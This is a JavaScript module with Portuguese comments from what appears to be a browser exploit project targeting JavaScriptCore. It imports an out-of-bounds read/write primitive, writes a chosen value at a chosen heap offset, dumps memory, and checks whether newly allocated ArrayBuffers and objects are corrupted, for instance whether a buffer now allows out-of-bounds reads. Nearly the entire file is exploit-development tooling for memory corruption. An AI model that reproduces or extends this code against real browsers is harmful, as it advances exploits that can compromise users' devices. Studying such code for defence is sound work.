// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
// (Mentalmente, considere este como o conteúdo de um futuro diagnoseHeapEffects.mjs)

import { logS3, PAUSE_S3, SHORT_PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs'; // JSC_OFFSETS não são usados diretamente aqui

export async function diagnoseHeapCorruptionEffects(corruptionOffset, valueToWrite) {
    const FNAME_DIAG = `diagnoseHeapCorruption<off:${toHex(corruptionOffset)},val:${toHex(valueToWrite)}>`;
    logS3(`--- Iniciando Diagnóstico de Efeitos de Corrupção de Heap ---`, "test", FNAME_DIAG);
    logS3(`    Corrupção OOB planejada: Valor=${toHex(valueToWrite)} @ Offset=${toHex(corruptionOffset)}`, "info", FNAME_DIAG);
    document.title = `HeapCorruptDiag: ${toHex(corruptionOffset)}`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real || !oob_dataview_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_DIAG);
        document.title = "ERRO OOB Setup";
        return;
    }
    logS3(`oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes. oob_dataview_real: offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.byteLength}`, "info", FNAME_DIAG);


    // 1. Leitura Detalhada Antes da Corrupção
    const regionToReadStart = 0x00;
    const regionToReadEnd = Math.min(0x100, oob_array_buffer_real.byteLength); // Ler primeiros 256 bytes ou até o fim do buffer
    logS3(`Memória em oob_array_buffer_real ANTES da corrupção (offsets ${toHex(regionToReadStart)}-${toHex(regionToReadEnd)}):`, "info", FNAME_DIAG);
    
    let initialMemorySnapshot = "";
    for (let i = regionToReadStart; i < regionToReadEnd; i += 4) {
        if (i % 16 === 0 && i > regionToReadStart) initialMemorySnapshot += "\n";
        if (i % 16 === 0) initialMemorySnapshot += `${toHex(i, 8)}: `;
        try {
            let val = oob_read_absolute(i, 4);
            initialMemorySnapshot += `${toHex(val, 32)} `;
        } catch (e) {
            initialMemorySnapshot += "ERR_READ ";
            logS3(`Erro ao ler offset ${toHex(i)} antes da corrupção: ${e.message}`, "warn", FNAME_DIAG);
        }
    }
    logS3(initialMemorySnapshot, "info", FNAME_DIAG);
    await PAUSE_S3(SHORT_PAUSE_S3);


    // 2. Escrita OOB
    logS3(`CORRUPÇÃO OOB: Escrevendo ${toHex(valueToWrite)} @ ${toHex(corruptionOffset)} (4 bytes)`, "warn", FNAME_DIAG);
    try {
        oob_write_absolute(corruptionOffset, valueToWrite, 4);
        logS3("Escrita OOB realizada.", "info", FNAME_DIAG);
    } catch (e_write) {
        logS3(`ERRO CRÍTICO durante a escrita OOB: ${e_write.message}`, "error", FNAME_DIAG);
        document.title = `ERRO OOB Write @${toHex(corruptionOffset)}`;
        clearOOBEnvironment();
        return;
    }
    document.title = `OOB Write Done @${toHex(corruptionOffset)}`;
    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para permitir que efeitos da corrupção (se houver) se propaguem


    // 3. Alocar Novos Objetos Pós-Corrupção
    logS3("Alocando novos objetos PÓS-corrupção...", "test", FNAME_DIAG);
    let new_ab, new_obj, new_arr;
    const new_ab_size = 128;
    let allocationError = null;
    try {
        logS3(`  Tentando new ArrayBuffer(${new_ab_size})...`, "info", FNAME_DIAG);
        new_ab = new ArrayBuffer(new_ab_size);
        logS3(`    Novo ArrayBuffer alocado. Tamanho esperado: ${new_ab_size}, Tamanho real via .byteLength: ${new_ab.byteLength}`, "leak", FNAME_DIAG);
        document.title = `New AB alloc OK`;

        logS3(`  Tentando new_obj = { test_prop: 0x1234, data_str: "corrupted_heap_test" }...`, "info", FNAME_DIAG);
        new_obj = { test_prop: 0x1234, data_str: "corrupted_heap_test" };
        logS3(`    Novo objeto literal criado: ${JSON.stringify(new_obj)}`, "info", FNAME_DIAG);

        logS3(`  Tentando new_arr = [0xA, 0xB, 0xC, 0xD]...`, "info", FNAME_DIAG);
        new_arr = [0xA, 0xB, 0xC, 0xD];
        logS3(`    Novo array criado: [${new_arr.map(x => toHex(x)).join(',')}]`, "info", FNAME_DIAG);

    } catch (e_alloc) {
        allocationError = e_alloc;
        logS3(`ERRO CRÍTICO ao alocar novos objetos pós-corrupção: ${e_alloc.name} - ${e_alloc.message}`, "error", FNAME_DIAG);
        document.title = `ERRO Alloc Pós-Corrupt`;
    }
    await PAUSE_S3(SHORT_PAUSE_S3);

    // 4. Inspecionar Novos Objetos (se a alocação não falhou)
    if (!allocationError) {
        if (new_ab) {
            logS3(`Inspecionando new_ab (esperado ${new_ab_size} bytes):`, "subtest", FNAME_DIAG);
            document.title = `Inspecting new_ab`;
            try {
                if (new_ab.byteLength !== new_ab_size) {
                    logS3(`    !!! ALERTA DE TAMANHO: new_ab.byteLength é ${new_ab.byteLength}, mas o esperado era ${new_ab_size} !!!`, "vuln", FNAME_DIAG);
                }
                let dv_new_ab = new DataView(new_ab);
                let val_at_0_new_ab = dv_new_ab.getUint32(0, true);
                logS3(`    Valor em new_ab[0] (lido via DataView): ${toHex(val_at_0_new_ab)}`, "info", FNAME_DIAG);
                
                dv_new_ab.setUint32(4, 0xABCDDCBA, true);
                let readback_new_ab = dv_new_ab.getUint32(4, true);
                if (readback_new_ab === 0xABCDDCBA) {
                    logS3(`    Leitura/Escrita básica em new_ab[4] OK.`, "good", FNAME_DIAG);
                } else {
                    logS3(`    !!! FALHA na Leitura/Escrita em new_ab[4]. Leu ${toHex(readback_new_ab)}, esperava 0xABCDDCBA !!!`, "error", FNAME_DIAG);
                }

                const oob_read_offset_new_ab = new_ab_size; // Imediatamente após o fim esperado
                if (dv_new_ab.byteLength >= oob_read_offset_new_ab + 4) {
                    logS3(`    Tentando leitura OOB em new_ab @ offset ${toHex(oob_read_offset_new_ab)} (new_ab.byteLength reportado: ${new_ab.byteLength})...`, "warn", FNAME_DIAG);
                    try {
                        let oob_val = dv_new_ab.getUint32(oob_read_offset_new_ab, true);
                        logS3(`    !!! LEITURA OOB EM NEW_AB BEM-SUCEDIDA @ ${toHex(oob_read_offset_new_ab)}: ${toHex(oob_val)} !!!`, "critical", FNAME_DIAG);
                        document.title = `OOB Read new_ab OK!`;
                    } catch (e_oob_read_new_ab) {
                        logS3(`    Erro (esperado se byteLength correto) ao tentar leitura OOB em new_ab @ ${toHex(oob_read_offset_new_ab)}: ${e_oob_read_new_ab.message}`, "good", FNAME_DIAG);
                    }
                } else {
                    logS3(`    new_ab.byteLength (${new_ab.byteLength}) não é grande o suficiente para tentativa de leitura OOB em ${toHex(oob_read_offset_new_ab)}.`, "info", FNAME_DIAG);
                }

            } catch (e_inspect_ab) {
                logS3(`ERRO ao inspecionar new_ab: ${e_inspect_ab.name} - ${e_inspect_ab.message}`, "error", FNAME_DIAG);
                document.title = `ERRO Inspect new_ab`;
            }
        }
        if (new_obj) {
            logS3(`Inspecionando new_obj:`, "subtest", FNAME_DIAG);
            try {
                logS3(`    new_obj.test_prop = ${new_obj.test_prop}, new_obj.data_str = "${new_obj.data_str}"`, "info", FNAME_DIAG);
                new_obj.another_prop = "test_after_corrupt_prop";
                if (new_obj.another_prop === "test_after_corrupt_prop") {
                    logS3(`    Atribuição e leitura de nova propriedade em new_obj OK.`, "good", FNAME_DIAG);
                }
            } catch (e_inspect_obj) {
                logS3(`ERRO ao inspecionar new_obj: ${e_inspect_obj.name} - ${e_inspect_obj.message}`, "error", FNAME_DIAG);
            }
        }
        if (new_arr) {
             logS3(`Inspecionando new_arr: length=${new_arr.length}, new_arr[0]=${toHex(new_arr[0])}`, "info", FNAME_DIAG);
        }
    }
    await PAUSE_S3(SHORT_PAUSE_S3);

    // 5. Verificar oob_dataview_real original
    logS3(`Verificando oob_dataview_real original pós-corrupção...`, "test", FNAME_DIAG);
    document.title = `Checking oob_dataview_real`;
    try {
        if (oob_dataview_real && oob_dataview_real.buffer && oob_dataview_real.buffer.byteLength > 0) {
            // Lê do início da DataView (offset 0 relativo ao DataView, que é oob_config.BASE_OFFSET_IN_DV do oob_array_buffer_real)
            let control_read = oob_dataview_real.getUint32(0, true); 
            logS3(`  Leitura de controle de oob_dataview_real[0] (abs offset ${toHex(OOB_CONFIG.BASE_OFFSET_IN_DV)}): ${toHex(control_read)}`, "good", FNAME_DIAG);
        } else {
            logS3(`  oob_dataview_real NULO ou buffer inválido/zerado!`, "error", FNAME_DIAG);
        }
    } catch (e_dv_orig) {
        logS3(`ERRO ao ler da oob_dataview_real original: ${e_dv_orig.name} - ${e_dv_orig.message}`, "error", FNAME_DIAG);
        document.title = `ERRO oob_dataview_real`;
    }

    logS3(`--- Diagnóstico de Efeitos de Corrupção de Heap CONCLUÍDO ---`, "test", FNAME_DIAG);
    document.title = `HeapCorruptDiag Done: ${toHex(corruptionOffset)}`;
    clearOOBEnvironment();
}
